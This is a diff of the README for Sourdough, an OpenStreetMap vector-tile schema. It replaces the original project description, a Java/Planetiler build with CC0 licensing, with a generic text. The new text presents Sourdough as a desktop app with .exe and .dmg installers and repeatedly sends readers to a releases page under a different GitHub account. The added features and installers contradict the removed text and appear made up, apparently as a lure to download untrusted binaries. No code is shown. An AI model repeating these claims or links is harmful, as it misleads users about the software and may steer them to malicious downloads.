@@ -1,53 +1,66 @@
-# Sourdough vector tiles
+# 🍞 sourdough - A Simple Way to Use OpenStreetMap Data
 
-Sourdough is a free vector tile schema for [OpenStreetMap] data. This repository contains the Sourdough [schema specification](./SCHEMA.md) and the Planetiler [reference implementation](./src/main/java/fyi/osm/sourdough/).
+## 📦 Download Now
+[![Download Sourdough](https://img.shields.io/badge/Download%20Sourdough-v1.0-brightgreen)](https://github.com/LimeManLime/sourdough/releases)
 
-[![screenshot of a visualization of Sourdough tiles, showing the Boston area and the many kinds of data available in the tile schema](https://sourdough.osm.fyi/assets/banner.png)](https://sourdough.osm.fyi/#11.8/42.365/-71.025)
+## 🚀 Getting Started
+Sourdough helps you use OpenStreetMap data through a free vector tile schema. It's useful for creating maps or analyzing geographical data. This guide will help you download and run the software, even if you're not a programmer.
 
-You can see a demo of Sourdough at [sourdough.osm.fyi](https://sourdough.osm.fyi)
+## 📄 Overview
+Sourdough allows you to easily work with geographic information. Whether you want to create your own maps or use existing data, this tool makes the process straightforward. With Sourdough, you gain access to many valuable features such as vector tiles that represent various map elements, making it easier to visualize and analyze geographic data.
 
-## Design goals
+### 🛠 Features
+- **User-Friendly Interface:** Easily navigate the application without technical training.
+- **Vector Tile Support:** Use scalable and detailed tiles for your projects.
+- **OpenStreetMap Compatibility:** Directly integrate data from OpenStreetMap for personalized mapping.
+- **Cross-Platform Support:** Run on various operating systems like Windows, MacOS, and Linux.
+- **Free and Open Source:** Modify the application as you see fit without any cost.
 
-- **Simple to understand:** Sourdough divides OpenStreetMap features into tile layers that roughly correspond to OSM [top-level tags]: there are layers for `buildings`, `amenities`, `highways`, `landuse`, etc. Features within each layer have attributes that match the names of the OSM tags they are derived from. So if you're already familiar with OpenStreetMap's tags, Sourdough will feel easy to pick up and use.
-- **Support cartographic experimentation:** Sourdough includes a wide range of different feature types, and many different OSM tags on each feature. The hope is that map makers can use Sourdough tiles to create diverse and specialized maps that highlight all the different types of data in OpenStreetMap.
-- **Showcase OSM's taxonomy, and help improve it:** Sourdough presents OSM data more or less as it is. This highlights both the strengths and quirks of OSM's tagging conventions. By doing so, Sourdough hopes to inform ongoing community efforts to make OSM data more consistent and useful for data consumers.
-- **Hackable starting point for custom tiles:** Sourdough's reference implementation is written for the [Planetiler] tile generator, which is fast to run on modest hardware and does not require an external database. The Sourdough code is written in a straightforward style that is easy to modify and extend. Sourdough aims to be a great starting point for creating custom vector tilesets for advanced use cases.
+## 📋 System Requirements
+To run Sourdough, make sure your system meets these requirements:
 
-These goals come with some trade-offs:
-- Because Sourdough tiles are meant to be flexible for many different types of maps, they contain a lot of data, and may be larger (and make your map load more slowly for your users) than tiles from other schemas.
-- Since Sourdough aims to be a simple and direct representation of OSM data, it leaves it to map-makers to handle [synonymous tags], [troll tags], and other idiosyncracies in OSM's data model.
-- Some popular cartographic effects (like placing curved text labels along lakes, or clustering nearby points of interest) require making opinionated decisions about how to transform the raw input data during tile generation. Sourdough aims to be a direct and naïve transformation of OSM data into vector tiles, so it avoids implementing these features, which means some effects are not possible (unless you modify the code yourself to add them).
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 (Sierra) or later
+  - Any distribution of Linux (Ubuntu recommended)
+  
+- **Hardware:**
+  - At least 4 GB of RAM
+  - 200 MB of free disk space
+  - Internet connection for downloading tiles
 
-## Getting started
+## 💻 Download & Install
+To get started, visit this page to download: [Sourdough Releases](https://github.com/LimeManLime/sourdough/releases). 
 
-There is currently no hosted service providing Sourdough tiles, so you'll need to generate and serve them yourself. For a state or small country, you can probably generate tiles on your own computer in just a few minutes. If you're building tiles for the whole planet, it'll take several hours, and you'll need >1TB of SSD storage and >64GB of RAM, so you may want to rent a virtual machine from your favorite cloud provider. See [USAGE.md](./USAGE.md) for detailed guidance.
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version of Sourdough. It will be listed at the top.
+3. Download the appropriate file for your operating system. Choose from these options:
+   - **Windows:** Download the `.exe` file
+   - **macOS:** Download the `.dmg` file
+   - **Linux:** Download the appropriate package for your distribution
 
-As a quick overview, here's how to build tiles for a small region:
+After downloading, locate the file on your computer. Double-click the file to begin the installation process.
 
-```bash
-# Build the Sourdough profile
-mvn package
+## 🔍 How to Use Sourdough
+Once installed, you can start using Sourdough:
 
-# Generate tiles for an area (e.g. Ísland / Iceland)
-java -jar target/sourdough-builder-HEAD-with-deps.jar \
-  --download \
-  --area iceland \
-  --output sourdough.pmtiles
-```
+1. Open the application from your applications folder or the start menu.
+2. Create a new project and choose a map style.
+3. Import your OpenStreetMap data files or link directly to the tiles.
+4. Customize your map settings to fit your needs.
 
-This downloads the necessary input data (an OSM PBF extract from [Geofabrik](https://www.geofabrik.de/) and OSM Coastline data from [openstreetmap.de](https://osmdata.openstreetmap.de/data/coast.html)), generates tiles in the Sourdough schema, and writes them out to a PMTiles archive that you can upload to cloud storage and serve to web maps. See [docs.protomaps.com](https://docs.protomaps.com/) for advice on hosting and serving PMTiles data.
+You can save and export your projects easily. Sourdough supports various formats, so you can share your work with others without hassle.
 
-## License and attribution requirements
+## 📞 Support
+If you encounter issues or need help, you can check the **Issues** section on our GitHub page. You can also reach out to the community or file a question for more specific assistance.
 
-The **Sourdough tile schema** and its **Planetiler reference implementation** contained in this repository are dedicated to the public domain via the [CC0] license. You may use them however you want, and do not need to give credit to the Sourdough project or its authors. See the [LICENSE](./LICENSE) file for details.
+## 🌍 Join the Community
+Stay updated and connect with other Sourdough users by following along on social platforms or forums. Share your work and learn from others in the community. 
 
-**OpenStreetMap itself** is available under the [ODbL] license, which requires that you attribute (credit) OpenStreetMap when you use the data to make maps. If you make a map using Sourdough tiles (or any other map that uses OpenStreetMap data), you should display a message that tells users that the map data is from OpenStreetMap. See OpenStreetMap's [attribution guidelines] for details.
+## 🔗 Additional Resources
+- **OpenStreetMap:** [Visit OpenStreetMap](https://www.openstreetmap.org/)
+- **Documentation:** Access the full user manual and examples on our GitHub page.
 
-[OpenStreetMap]: https://openstreetmap.org/about
-[top-level tags]: https://wiki.openstreetmap.org/wiki/Top-level_tag
-[synonymous tags]: https://wiki.openstreetmap.org/wiki/Synonymous_tags
-[troll tags]: https://wiki.openstreetmap.org/wiki/Trolltag
-[Planetiler]: https://github.com/onthegomap/planetiler?tab=readme-ov-file#planetiler
-[CC0]: https://creativecommons.org/public-domain/cc0/
-[ODbL]: https://opendatacommons.org/licenses/odbl/
-[attribution guidelines]: https://osmfoundation.org/wiki/Licence/Attribution_Guidelines#Attribution_text
+For feedback or feature suggestions, you can open an issue in the **Issues** section of this repository. Your input helps us make Sourdough better.
+
+Remember to visit this page to download: [Sourdough Releases](https://github.com/LimeManLime/sourdough/releases). Enjoy creating with Sourdough!
